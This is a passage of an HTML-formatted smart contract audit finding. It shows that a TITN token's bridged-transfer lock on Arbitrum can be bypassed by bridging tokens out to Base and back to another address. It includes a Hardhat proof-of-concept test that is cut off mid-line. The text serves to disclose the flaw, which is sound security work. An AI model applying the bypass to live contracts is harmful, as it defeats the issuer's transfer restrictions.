class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eValidates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erestrictions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eThe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;s address\u003c/span\u003e\u003cspan class=\"mtk14\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eThe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecipient\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;s address\u003c/span\u003e\u003cspan class=\"mtk14\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Arbitrum chain ID\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e42161\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if the transfer is restricted\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Exclude owner from restrictions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to the transferAllowedContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to the transferAllowedContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if bridged transfers are locked\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Restrict bridged token holders OR apply Arbitrum-specific restriction\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to LayerZero endpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, since bridge operations do not use \u003ccode\u003etransfer\u003c/code\u003e/\u003ccode\u003etransferFrom\u003c/code\u003e, but instead use \u003ccode\u003emint\u003c/code\u003e/\u003ccode\u003eburn\u003c/code\u003e, this allows users to transfer tokens to any address by performing two bridge operations. \u003c/p\u003e\n\u003cp\u003eFor example:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eCurrently, \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to \u003ccode\u003etrue\u003c/code\u003e, and \u003ccode\u003euser1\u003c/code\u003e holds 1 Ether TITN on Arbitrum. \u003ccode\u003euser1\u003c/code\u003e wants to transfer these tokens to \u003ccode\u003euser2\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e calls \u003ccode\u003esend\u003c/code\u003e to bridge the TITN to their address on Base.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e calls \u003ccode\u003esend\u003c/code\u003e again on Base to bridge the TITN to \u003ccode\u003euser2\u003c/code\u003e’s address on Arbitrum.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e successfully sends 1 Ether TITN to \u003ccode\u003euser2\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eProof Of Concept\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eTo run the POC, you can add the following code to the test/hardhat/MergeTgt.test.ts file:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;user1  transfer TITN tokens to user2 by bridge when transfer disable\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// transfer TGT to the merge contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// claim TITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// attempt to transfer TITN (spoiler alert: it should fail)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Transaction should have reverted\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eany\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emessage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einclude\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;BridgedTokensTransferLocked\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Minting an initial amount of tokens to ownerA\u0026#39;s address in the TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining the amount of tokens to send and constructing the parameters for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining extra message execution options for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan 